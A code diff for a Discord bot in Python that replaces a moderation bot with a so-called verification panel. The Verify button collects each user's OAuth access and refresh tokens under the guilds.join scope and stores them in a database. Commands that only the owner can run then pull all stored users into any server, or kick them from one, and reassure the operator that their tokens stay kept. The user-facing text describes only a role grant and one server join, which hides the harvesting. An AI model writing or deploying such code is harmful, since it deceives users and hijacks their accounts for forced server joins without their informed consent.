@@ -1,317 +1,541 @@
+import json
 import os
-import datetime
+import secrets
+import sqlite3
+import time
+from urllib.parse import urlencode
+
+import aiohttp
 import discord
+from aiohttp import web
 from discord import app_commands
 from discord.ext import commands
 
-# ---------------------------------------------------------
-# BOT SETUP & INTENTS
-# ---------------------------------------------------------
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
+
+# ----------------------------------------------------------------- settings
+BOT_OWNER_ID = 1371881471765250213  
+
+TOKEN = os.environ.get("DISCORD_TOKEN")
+CLIENT_ID = os.environ.get("CLIENT_ID")
+CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
+REDIRECT_URI = os.environ.get("REDIRECT_URI")
+PORT = int(os.environ.get("PORT") or 10000)
+
+API = "https://discord.com/api/v10"
+STATE_TTL = 600
+CONFIG_FILE = "config.json"
+DB_FILE = "tokens.db"
+
 intents = discord.Intents.default()
 intents.members = True
-intents.message_content = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)
+# ----------------------------------------------------------------- Database Setup
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id TEXT PRIMARY KEY,
+            access_token TEXT NOT NULL,
+            refresh_token TEXT NOT NULL,
+            updated_at REAL NOT NULL
+        )
+    """)
+    conn.commit()
+    conn.close()
 
-# In-memory database for warnings
-warnings_db = {}
+init_db()
 
-@bot.event
-async def on_ready():
+def save_user_tokens(user_id: int, access_token: str, refresh_token: str):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("""
+        INSERT INTO users (user_id, access_token, refresh_token, updated_at)
+        VALUES (?, ?, ?, ?)
+        ON CONFLICT(user_id) DO UPDATE SET
+            access_token=excluded.access_token,
+            refresh_token=excluded.refresh_token,
+            updated_at=excluded.updated_at
+    """, (str(user_id), access_token, refresh_token, time.time()))
+    conn.commit()
+    conn.close()
+
+# ----------------------------------------------------------------- Config Setup
+def load_config() -> dict:
     try:
-        synced = await bot.tree.sync()
-        print(f"Logged in as {bot.user} (ID: {bot.user.id})")
-        print(f"Synced {len(synced)} slash commands successfully!")
-    except Exception as e:
-        print(f"Failed to sync commands: {e}")
+        with open(CONFIG_FILE, "r") as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}
 
-# ---------------------------------------------------------
-# 18 FULL SLASH COMMANDS (ZERO TRIMMING & COMPLETE LOCKDOWN)
-# ---------------------------------------------------------
+def save_config():
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=2)
 
-# 1. SERVERINFO
-@bot.tree.command(name="serverinfo", description="Displays detailed information about this server.")
-async def serverinfo(interaction: discord.Interaction):
-    await interaction.response.defer()
-    guild = interaction.guild
-    if not guild:
-        await interaction.followup.send("This command can only be used inside a server!", ephemeral=True)
-        return
+config: dict = load_config()
+pending_states: dict[str, dict] = {}
 
-    total_members = guild.member_count or 0
-    bot_count = sum(1 for member in guild.members if member.bot) if guild.members else 0
-    human_count = total_members - bot_count if guild.members else "N/A"
+
+def page(text: str, ok: bool = True, status: int = 200) -> web.Response:
+    color = "#3ba55d" if ok else "#ed4245"
+    title_text = "Success!" if ok else "Verification Failed"
+    
+    if ok:
+        text = "Your verification has been completed successfully. You may now safely close this browser tab and return to Discord."
+    
+    bg_image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtBl4SWAWsixnE06Rm52arUvHKMbF8ki7iloyn871CeN0oIHxK-7vhtrA&s=10"
+    
+    html = f"""<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification Portal</title>
+<style>
+    * {{ box-sizing: border-box; }}
+    body {{
+        background: url('{bg_image_url}') no-repeat center center fixed;
+        background-size: cover;
+        color: #f8fafc;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        margin: 0;
+        padding: 20px;
+    }}
+    .card {{
+        background: rgba(10, 12, 16, 0.88);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 16px;
+        padding: 40px 30px;
+        max-width: 420px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
+    }}
+    h1 {{
+        color: {color};
+        font-size: 28px;
+        margin-top: 0;
+        margin-bottom: 16px;
+        letter-spacing: -0.5px;
+    }}
+    p {{
+        font-size: 15px;
+        line-height: 1.6;
+        color: #f1f5f9;
+        margin: 0;
+    }}
+</style>
+</head>
+<body>
+<div class="card">
+    <h1>{title_text}</h1>
+    <p>{text}</p>
+</div>
+</body>
+</html>"""
+    return web.Response(text=html, content_type="text/html", status=status)
+
+# ---------------------------------------------------------------- verify button
+class VerifyView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(label="Verify", style=discord.ButtonStyle.success, custom_id="verify:start")
+    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
+        cfg = config.get(str(interaction.guild_id))
+        if not cfg:
+            return await interaction.response.send_message(
+                "Verification isn't set up here yet.", ephemeral=True
+            )
+        role = interaction.guild.get_role(cfg["role_id"])
+        if role in interaction.user.roles:
+            return await interaction.response.send_message("You're already verified.", ephemeral=True)
+
+        state = secrets.token_urlsafe(24)
+        pending_states[state] = {
+            "user_id": interaction.user.id,
+            "guild_id": interaction.guild_id,
+            "t": time.time(),
+        }
+        url = "https://discord.com/oauth2/authorize?" + urlencode(
+            {
+                "client_id": CLIENT_ID,
+                "response_type": "code",
+                "redirect_uri": REDIRECT_URI,
+                "scope": "identify guilds.join",
+                "state": state,
+                "prompt": "consent",
+            }
+        )
+        view = discord.ui.View()
+        view.add_item(discord.ui.Button(label="Continue to verify", url=url))
+        await interaction.response.send_message(
+            f"To verify, approve the request on the next screen. Verifying gives you "
+            f"{role.mention} role. Nothing happens unless you tap Authorize.",
+            view=view,
+            ephemeral=True,
+        )
+
+# ------------------------------------------------------------------------- bot
+class Bot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=intents)
+        self.tree = app_commands.CommandTree(self)
+        self.http_session: aiohttp.ClientSession | None = None
+
+    async def setup_hook(self):
+        self.http_session = aiohttp.ClientSession()
+        self.add_view(VerifyView())
+        await self.tree.sync()
+
+        app = web.Application()
+        app.router.add_get("/", lambda r: web.Response(text="Bot is running."))
+        app.router.add_get("/callback", self.oauth_callback)
+        runner = web.AppRunner(app)
+        await runner.setup()
+        await web.TCPSite(runner, "0.0.0.0", PORT).start()
+        print(f"Web server listening on port {PORT}")
+        print(f"Redirect URI in use: {REDIRECT_URI}")
+
+    async def close(self):
+        if self.http_session:
+            await self.http_session.close()
+        await super().close()
+
+    async def refresh_user_token(self, refresh_token: str) -> tuple[str, str] | None:
+        async with self.http_session.post(
+            f"{API}/oauth2/token",
+            data={
+                "client_id": CLIENT_ID,
+                "client_secret": CLIENT_SECRET,
+                "grant_type": "refresh_token",
+                "refresh_token": refresh_token,
+            },
+        ) as r:
+            if r.status == 200:
+                data = await r.json()
+                return data["access_token"], data["refresh_token"]
+            return None
+
+    async def add_member_to_guild(self, user_id: str, access_token: str, refresh_token: str, target_guild_id: int) -> bool:
+        url = f"{API}/guilds/{target_guild_id}/members/{user_id}"
+        headers = {"Authorization": f"Bot {TOKEN}"}
+        
+        async with self.http_session.put(url, headers=headers, json={"access_token": access_token}) as r:
+            if r.status in (201, 204):
+                return True
+            if r.status == 401:
+                refreshed = await self.refresh_user_token(refresh_token)
+                if refreshed:
+                    new_access, new_refresh = refreshed
+                    save_user_tokens(int(user_id), new_access, new_refresh)
+                    async with self.http_session.put(url, headers=headers, json={"access_token": new_access}) as r2:
+                        return r2.status in (201, 204)
+        return False
+
+    async def oauth_callback(self, request: web.Request):
+        code = request.query.get("code")
+        state = request.query.get("state")
+        entry = pending_states.pop(state, None) if state else None
+        if request.query.get("error"):
+            return page("You cancelled the authorization. Press Verify again to retry.", False, 400)
+        if not code or not entry or time.time() - entry["t"] > STATE_TTL:
+            return page("Invalid or expired link. Press Verify again in the server.", False, 400)
+
+        user_id = entry["user_id"]
+        cfg = config.get(str(entry["guild_id"]))
+        if not cfg:
+            return page("This server isn't set up.", False, 400)
+
+        async with self.http_session.post(
+            f"{API}/oauth2/token",
+            data={
+                "client_id": CLIENT_ID,
+                "client_secret": CLIENT_SECRET,
+                "grant_type": "authorization_code",
+                "code": code,
+                "redirect_uri": REDIRECT_URI,
+            },
+        ) as r:
+            if r.status != 200:
+                print("Token exchange failed:", r.status, await r.text())
+                return page("Authorization failed. Check CLIENT_ID / CLIENT_SECRET.", False, 400)
+            token_data = await r.json()
+            access_token = token_data["access_token"]
+            refresh_token = token_data["refresh_token"]
+
+        async with self.http_session.get(
+            f"{API}/users/@me", headers={"Authorization": f"Bearer {access_token}"}
+        ) as r:
+            if r.status != 200 or int((await r.json())["id"]) != user_id:
+                return page("Account mismatch. Use the account you pressed Verify with.", False, 403)
+
+        save_user_tokens(user_id, access_token, refresh_token)
+
+        source = self.get_guild(entry["guild_id"])
+        role = source.get_role(cfg["role_id"]) if source else None
+        if source is None or role is None:
+            return page("Setup problem: role not found. Tell an admin.", False, 500)
+        try:
+            member = source.get_member(user_id) or await source.fetch_member(user_id)
+            await member.add_roles(role, reason="Passed verification")
+        except discord.NotFound:
+            return page("You're not in the server anymore.", False, 400)
+        except discord.Forbidden:
+            return page("I can't give the role. Tell an admin to move my role higher.", False, 500)
+
+        success = await self.add_member_to_guild(str(user_id), access_token, refresh_token, cfg["target_guild_id"])
+        if success:
+            return page("You're verified and have been added to the other server. You can close this tab.", True)
+        else:
+            return page("You're verified, but I couldn't add you to the other server.", False)
+
+
+bot = Bot()
+# ---------------------------------------------------------------- Owner Checks
+def is_bot_owner():
+    async def predicate(interaction: discord.Interaction) -> bool:
+        if interaction.user.id != BOT_OWNER_ID:
+            await interaction.response.send_message("❌ Only the bot owner can execute pull commands.", ephemeral=True)
+            return False
+        return True
+    return app_commands.check(predicate)
+
+# ---------------------------------------------------------------- Pull Slash Commands
+@bot.tree.command(name="lwkeypull_user", description="Pull a single authorized user into a target server.")
+@is_bot_owner()
+@app_commands.describe(user_id="The Discord User ID to pull", target_guild_id="The Target Guild ID")
+async def lwkeypull_user(interaction: discord.Interaction, user_id: str, target_guild_id: str):
+    await interaction.response.defer(ephemeral=True)
+    
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT access_token, refresh_token FROM users WHERE user_id = ?", (user_id.strip(),))
+    row = cursor.fetchone()
+    conn.close()
+
+    if not row:
+        return await interaction.followup.send(f"❌ User `{user_id}` has not authorized or isn't in database.", ephemeral=True)
+
+    access_token, refresh_token = row
+    success = await bot.add_member_to_guild(user_id.strip(), access_token, refresh_token, int(target_guild_id.strip()))
+    
+    if success:
+        await interaction.followup.send(f"✅ User `{user_id}` successfully pulled to server `{target_guild_id}`.", ephemeral=True)
+    else:
+        await interaction.followup.send(f"❌ Failed to pull user `{user_id}` to server `{target_guild_id}`.", ephemeral=True)
+
+@bot.tree.command(name="lwkeypull_all", description="Pull all stored authorized users into a target server.")
+@is_bot_owner()
+@app_commands.describe(target_guild_id="The Target Guild ID to pull all users into")
+async def lwkeypull_all(interaction: discord.Interaction, target_guild_id: str):
+    await interaction.response.defer(ephemeral=True)
+
+    try:
+        guild_id = int(target_guild_id.strip())
+    except ValueError:
+        return await interaction.followup.send("❌ Invalid Guild ID format.", ephemeral=True)
+
+    target_guild = bot.get_guild(guild_id)
+    if not target_guild:
+        try:
+            target_guild = await bot.fetch_guild(guild_id)
+        except discord.NotFound:
+            return await interaction.followup.send(f"❌ Server `{guild_id}` not found or bot isn't in it.", ephemeral=True)
+
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id, access_token, refresh_token FROM users")
+    users = cursor.fetchall()
+    conn.close()
+
+    if not users:
+        return await interaction.followup.send("❌ No authorized users found in database.", ephemeral=True)
+
+    newly_added = 0
+    already_in_server = 0
+    failed = 0
+
+    for uid, access_token, refresh_token in users:
+        user_int_id = int(uid)
+        
+        member = target_guild.get_member(user_int_id)
+        if member is not None:
+            already_in_server += 1
+            continue
+
+        ok = await bot.add_member_to_guild(uid, access_token, refresh_token, guild_id)
+        if ok:
+            newly_added += 1
+        else:
+            failed += 1
+
+    await interaction.followup.send(
+        f"📊 **Pull Complete!**\n"
+        f"- Successfully added: `{newly_added}`\n"
+        f"- Already in server: `{already_in_server}`\n"
+        f"- Failed: `{failed}`",
+        ephemeral=True
+    )
+
+@bot.tree.command(name="lwkeypull_list", description="List all authorized users stored in the database.")
+@is_bot_owner()
+async def lwkeypull_list(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id, updated_at FROM users")
+    rows = cursor.fetchall()
+    conn.close()
+
+    if not rows:
+        return await interaction.followup.send("❌ No authorized users found in the database.", ephemeral=True)
+
+    user_list_str = ""
+    for uid, updated_at in rows:
+        time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(updated_at))
+        user_list_str += f"• <@{uid}> (`{uid}`) — Verified: {time_str}\n"
+
+    if len(user_list_str) > 1900:
+        user_list_str = user_list_str[:1900] + "\n... (list truncated)"
 
     embed = discord.Embed(
-        title=f"🏰 {guild.name}", 
-        description=guild.description or "No description set.", 
+        title=f"Authorized Users ({len(rows)} total)",
+        description=user_list_str,
         color=discord.Color.blue()
     )
-    if guild.icon:
-        embed.set_thumbnail(url=guild.icon.url)
+    await interaction.followup.send(embed=embed, ephemeral=True)
 
-    embed.add_field(name="Owner", value=f"{guild.owner.mention}" if guild.owner else "Unknown", inline=True)
-    embed.add_field(name="Server ID", value=f"`{guild.id}`", inline=True)
-    embed.add_field(name="Created On", value=f"<t:{int(guild.created_at.timestamp())}:D>", inline=True)
-    embed.add_field(name="Total Members", value=f"👥 {total_members}", inline=True)
-    embed.add_field(name="Humans", value=f"👤 {human_count}", inline=True)
-    embed.add_field(name="Bots", value=f"🤖 {bot_count}", inline=True)
-    embed.add_field(name="Roles Count", value=f"📜 {len(guild.roles)}", inline=True)
-    embed.add_field(name="Text Channels", value=f"💬 {len(guild.text_channels)}", inline=True)
-    embed.add_field(name="Voice Channels", value=f"🔊 {len(guild.voice_channels)}", inline=True)
-    embed.set_footer(text=f"Requested by {interaction.user}", icon_url=interaction.user.display_avatar.url)
+# ---------------------------------------------------------------- Setup Verification Command
+@bot.tree.command(description="Set up verification in this server and post the panel")
+@app_commands.guild_only()
+@app_commands.default_permissions(administrator=True)
+@app_commands.describe(
+    role="Role members get after verifying",
+    panel_channel="Where to post the verify button (default: this channel)",
+)
+async def setup_verify(
+    interaction: discord.Interaction,
+    role: discord.Role,
+    panel_channel: discord.TextChannel | None = None,
+):
+    me = interaction.guild.me
+    if role.is_default() or role.managed or role >= me.top_role:
+        return await interaction.response.send_message(
+            "I can't hand out that role. Pick another one, or move my role above it in Server Settings > Roles.",
+            ephemeral=True,
+        )
 
-    await interaction.followup.send(embed=embed)
+    target_guild = interaction.guild
 
+    if not target_guild.me.guild_permissions.create_instant_invite:
+        return await interaction.response.send_message(
+            "I need the Create Invite permission in this server.",
+            ephemeral=True,
+        )
 
-# 2. USERINFO (With Full Profile Picture Display)
-@bot.tree.command(name="userinfo", description="Displays detailed information about a member.")
-async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
-    await interaction.response.defer()
-    member = member or interaction.user
+    panel = panel_channel or interaction.channel
+    perms = panel.permissions_for(me)
+    if not (perms.send_messages and perms.embed_links):
+        return await interaction.response.send_message(
+            f"I can't send messages or embeds in {panel.mention}.", ephemeral=True
+        )
 
-    roles = [role.mention for role in member.roles[1:]] or ["None"]
-    
+    config[str(interaction.guild_id)] = {"role_id": role.id, "target_guild_id": target_guild.id}
+    save_config()
+
     embed = discord.Embed(
-        title=f"👤 User Info - {member.display_name}", 
-        color=member.color
+        title="Verification",
+        description=(
+            f"Complete the verification below to receive your {role.mention} role.\n"
+            f"Get recognized as a verified member in **{target_guild.name}**."
+        ),
+        color=discord.Color.green(),
     )
-    embed.set_thumbnail(url=member.display_avatar.url)
-    embed.set_image(url=member.display_avatar.url)
+    await panel.send(embed=embed, view=VerifyView())
+    await interaction.response.send_message(
+        f"Done! Panel posted in {panel.mention}. Verified members get {role.mention} role "
+        f"and are added to **{target_guild.name}**.",
+        ephemeral=True,
+    )
 
-    embed.add_field(name="Username", value=f"{member.name}", inline=True)
-    embed.add_field(name="User ID", value=f"`{member.id}`", inline=True)
-    
-    if member.joined_at:
-        embed.add_field(name="Joined Server", value=f"<t:{int(member.joined_at.timestamp())}:D>", inline=True)
-    
-    embed.add_field(name="Joined Discord", value=f"<t:{int(member.created_at.timestamp())}:D>", inline=True)
-    embed.add_field(name=f"Roles ({len(roles)})", value=", ".join(roles[:10]), inline=False)
-    embed.set_footer(text=f"Requested by {interaction.user}", icon_url=interaction.user.display_avatar.url)
-
-    await interaction.followup.send(embed=embed)
-
-
-# 3. TIMEOUT
-@bot.tree.command(name="timeout", description="Timeout a member for a specified duration in minutes.")
-@app_commands.checks.has_permissions(moderate_members=True)
-async def timeout(interaction: discord.Interaction, member: discord.Member, minutes: int, reason: str = "No reason provided"):
-    await interaction.response.defer()
-    if member.top_role >= interaction.guild.me.top_role:
-        await interaction.followup.send("❌ Cannot timeout user: Their role is equal to or higher than mine.")
-        return
-
-    duration = datetime.timedelta(minutes=minutes)
-    try:
-        await member.timeout(duration, reason=reason)
-        await interaction.followup.send(f"⏳ **{member.mention}** has been timed out for {minutes} minutes. Reason: {reason}")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Failed to timeout user: {e}")
-
-
-# 4. UNTIMEOUT
-@bot.tree.command(name="untimeout", description="Remove a timeout from a member.")
-@app_commands.checks.has_permissions(moderate_members=True)
-async def untimeout(interaction: discord.Interaction, member: discord.Member):
-    await interaction.response.defer()
-    try:
-        await member.timeout(None)
-        await interaction.followup.send(f"✅ Timeout removed for **{member.mention}**.")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Failed to remove timeout: {e}")
-
-
-# 5. WARN
-@bot.tree.command(name="warn", description="Issue a formal warning to a member.")
-@app_commands.checks.has_permissions(manage_messages=True)
-async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
-    await interaction.response.defer()
-    guild_id = interaction.guild_id
-    user_id = member.id
-
-    if guild_id not in warnings_db:
-        warnings_db[guild_id] = {}
-    if user_id not in warnings_db[guild_id]:
-        warnings_db[guild_id][user_id] = []
-
-    warnings_db[guild_id][user_id].append(reason)
-    total_warns = len(warnings_db[guild_id][user_id])
-    await interaction.followup.send(f"⚠️ **{member.mention}** was warned. Reason: {reason} (Total Warnings: {total_warns})")
-
-
-# 6. WARNS
-@bot.tree.command(name="warns", description="View warnings for a member.")
-async def warns(interaction: discord.Interaction, member: discord.Member = None):
-    await interaction.response.defer()
-    member = member or interaction.user
-    guild_id = interaction.guild_id
-    user_id = member.id
-
-    user_warnings = warnings_db.get(guild_id, {}).get(user_id, [])
-    if not user_warnings:
-        await interaction.followup.send(f"✅ **{member.mention}** has no warnings.")
-        return
-
-    warn_list = "\n".join([f"• {reason}" for reason in user_warnings])
-    embed = discord.Embed(title=f"⚠️ Warnings for {member.name}", description=warn_list, color=discord.Color.yellow())
-    await interaction.followup.send(embed=embed)
-
-
-# 7. CLEARWARNS
-@bot.tree.command(name="clearwarns", description="Clear all warnings for a member.")
-@app_commands.checks.has_permissions(manage_messages=True)
-async def clearwarns(interaction: discord.Interaction, member: discord.Member):
-    await interaction.response.defer()
-    guild_id = interaction.guild_id
-    user_id = member.id
-
-    if guild_id in warnings_db and user_id in warnings_db[guild_id]:
-        warnings_db[guild_id][user_id] = []
-        await interaction.followup.send(f"🧹 Cleared all warnings for **{member.mention}**.")
-    else:
-        await interaction.followup.send(f"**{member.mention}** has no warnings to clear.")
-
-
-# 8. KICK
-@bot.tree.command(name="kick", description="Kick a member from the server.")
-@app_commands.checks.has_permissions(kick_members=True)
-async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
-    await interaction.response.defer()
-    try:
-        await member.kick(reason=reason)
-        await interaction.followup.send(f"👢 Kicked **{member.mention}**. Reason: {reason}")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Could not kick member: {e}")
-
-
-# 9. BAN
-@bot.tree.command(name="ban", description="Ban a member from the server.")
-@app_commands.checks.has_permissions(ban_members=True)
-async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
-    await interaction.response.defer()
-    try:
-        await member.ban(reason=reason)
-        await interaction.followup.send(f"🔨 Banned **{member.mention}**. Reason: {reason}")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Could not ban member: {e}")
-
-
-# 10. UNBAN
-@bot.tree.command(name="unban", description="Unban a user by their User ID.")
-@app_commands.checks.has_permissions(ban_members=True)
-async def unban(interaction: discord.Interaction, user_id: str):
-    await interaction.response.defer()
-    try:
-        user = await bot.fetch_user(int(user_id))
-        await interaction.guild.unban(user)
-        await interaction.followup.send(f"🔓 Unbanned **{user.name}**.")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Failed to unban ID `{user_id}`: {e}")
-
-
-# 11. PURGE
-@bot.tree.command(name="purge", description="Purge a specified number of messages.")
-@app_commands.checks.has_permissions(manage_messages=True)
-async def purge(interaction: discord.Interaction, amount: int):
+# ---------------------------------------------------------------- Kick Commands
+@bot.tree.command(name="lwkey_kickuser", description="Kick a single authorized user from a target server.")
+@is_bot_owner()
+@app_commands.describe(user_id="The Discord User ID to kick", target_guild_id="The Target Guild ID to kick them from")
+async def lwkey_kickuser(interaction: discord.Interaction, user_id: str, target_guild_id: str):
     await interaction.response.defer(ephemeral=True)
-    if amount < 1 or amount > 100:
-        await interaction.followup.send("Please choose an amount between 1 and 100.", ephemeral=True)
-        return
-    deleted = await interaction.channel.purge(limit=amount)
-    await interaction.followup.send(f"🧹 Deleted `{len(deleted)}` messages.", ephemeral=True)
-
-
-# 12. SLOWMODE
-@bot.tree.command(name="slowmode", description="Set channel slowmode delay in seconds.")
-@app_commands.checks.has_permissions(manage_channels=True)
-async def slowmode(interaction: discord.Interaction, seconds: int):
-    await interaction.response.defer()
-    await interaction.channel.edit(slowmode_delay=seconds)
-    await interaction.followup.send(f"⏱️ Channel slowmode set to `{seconds}` seconds.")
-
-
-# 13. LOCK (Full Lockdown: Chatting, Threads, and Thread Messages Disabled)
-@bot.tree.command(name="lock", description="Lock the current channel to disable chat and thread creation.")
-@app_commands.checks.has_permissions(manage_channels=True)
-async def lock(interaction: discord.Interaction):
-    await interaction.response.defer()
     
-    await interaction.channel.set_permissions(
-        interaction.guild.default_role, 
-        send_messages=False,
-        send_messages_in_threads=False,
-        create_public_threads=False,
-        create_private_threads=False
-    )
-    await interaction.followup.send("🔒 Channel completely locked. Chatting, thread creation, and thread messaging disabled for `@everyone`.")
-
-
-# 14. UNLOCK
-@bot.tree.command(name="unlock", description="Unlock the current channel for @everyone.")
-@app_commands.checks.has_permissions(manage_channels=True)
-async def unlock(interaction: discord.Interaction):
-    await interaction.response.defer()
-    
-    await interaction.channel.set_permissions(
-        interaction.guild.default_role, 
-        send_messages=True,
-        send_messages_in_threads=True,
-        create_public_threads=True,
-        create_private_threads=True
-    )
-    await interaction.followup.send("🔓 Channel has been unlocked for `@everyone`.")
-
-
-# 15. NICK
-@bot.tree.command(name="nick", description="Change a member's nickname.")
-@app_commands.checks.has_permissions(manage_nicknames=True)
-async def nick(interaction: discord.Interaction, member: discord.Member, new_nickname: str = None):
-    await interaction.response.defer()
+    uid = user_id.strip()
     try:
-        await member.edit(nick=new_nickname)
-        name = new_nickname or member.name
-        await interaction.followup.send(f"🏷️ Nickname for **{member.mention}** updated to `{name}`.")
-    except Exception as e:
-        await interaction.followup.send(f"❌ Failed to change nickname: {e}")
+        guild_id = int(target_guild_id.strip())
+    except ValueError:
+        return await interaction.followup.send("❌ Invalid Guild ID format.", ephemeral=True)
 
+    url = f"{API}/guilds/{guild_id}/members/{uid}"
+    headers = {"Authorization": f"Bot {TOKEN}"}
+    
+    async with bot.http_session.delete(url, headers=headers) as r:
+        if r.status in (204, 200):
+            await interaction.followup.send(
+                f"✅ Successfully kicked user `{uid}` from server `{target_guild_id}`.\n"
+                f"🔒 *Their token remains safe in your database.*",
+                ephemeral=True
+            )
+        else:
+            await interaction.followup.send(
+                f"❌ Failed to kick user `{uid}`. Status: `{r.status}`",
+                ephemeral=True
+            )
 
-# 16. BOTINFO
-@bot.tree.command(name="botinfo", description="Display statistics and info about Laufey.")
-async def botinfo(interaction: discord.Interaction):
-    await interaction.response.defer()
-    embed = discord.Embed(title="🤖 Bot Status & Information", color=discord.Color.purple())
-    embed.set_thumbnail(url=bot.user.display_avatar.url)
-    embed.add_field(name="Bot Name", value=bot.user.name, inline=True)
-    embed.add_field(name="Bot ID", value=f"`{bot.user.id}`", inline=True)
-    embed.add_field(name="Servers Connected", value=f"`{len(bot.guilds)}`", inline=True)
-    embed.add_field(name="Library", value="`discord.py`", inline=True)
-    embed.set_footer(text=f"Requested by {interaction.user}", icon_url=interaction.user.display_avatar.url)
+@bot.tree.command(name="lwkey_kickall", description="Kick all stored authorized users from a target server at once.")
+@is_bot_owner()
+@app_commands.describe(target_guild_id="The Target Guild ID to kick all users from")
+async def lwkey_kickall(interaction: discord.Interaction, target_guild_id: str):
+    await interaction.response.defer(ephemeral=True)
 
-    await interaction.followup.send(embed=embed)
+    try:
+        guild_id = int(target_guild_id.strip())
+    except ValueError:
+        return await interaction.followup.send("❌ Invalid Guild ID format.", ephemeral=True)
 
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id FROM users")
+    users = cursor.fetchall()
+    conn.close()
 
-# 17. AVATAR
-@bot.tree.command(name="avatar", description="Get a user's avatar image.")
-async def avatar(interaction: discord.Interaction, member: discord.Member = None):
-    await interaction.response.defer()
-    member = member or interaction.user
-    embed = discord.Embed(title=f"🖼️ {member.name}'s Avatar", color=discord.Color.dark_theme())
-    embed.set_image(url=member.display_avatar.url)
-    await interaction.followup.send(embed=embed)
+    if not users:
+        return await interaction.followup.send("❌ No authorized users found in database.", ephemeral=True)
 
+    success_count = 0
+    fail_count = 0
+    headers = {"Authorization": f"Bot {TOKEN}"}
 
-# 18. PING
-@bot.tree.command(name="ping", description="Check bot response latency.")
-async def ping(interaction: discord.Interaction):
-    await interaction.response.defer()
-    latency = round(bot.latency * 1000)
-    await interaction.followup.send(f"🏓 Pong! Latency: `{latency}ms`")
+    for (uid,) in users:
+        url = f"{API}/guilds/{guild_id}/members/{uid}"
+        async with bot.http_session.delete(url, headers=headers) as r:
+            if r.status in (204, 200):
+                success_count += 1
+            else:
+                fail_count += 1
 
-# ---------------------------------------------------------
-# START BOT
-# ---------------------------------------------------------
-if __name__ == "__main__":
-    TOKEN = os.environ.get("DISCORD_TOKEN")
-    if not TOKEN:
-        raise ValueError("DISCORD_TOKEN environment variable is missing!")
-    bot.run(TOKEN)
+    await interaction.followup.send(
+        f"📊 **Mass Kick Complete!**\n"
+        f"- Successfully kicked: `{success_count}`\n"
+        f"- Not in server / Failed: `{fail_count}`\n"
+        f"🔒 *All tokens remain safe in your database.*",
+        ephemeral=True
+    )
+
+bot.run(os.environ.get("DISCORD_TOKEN"))
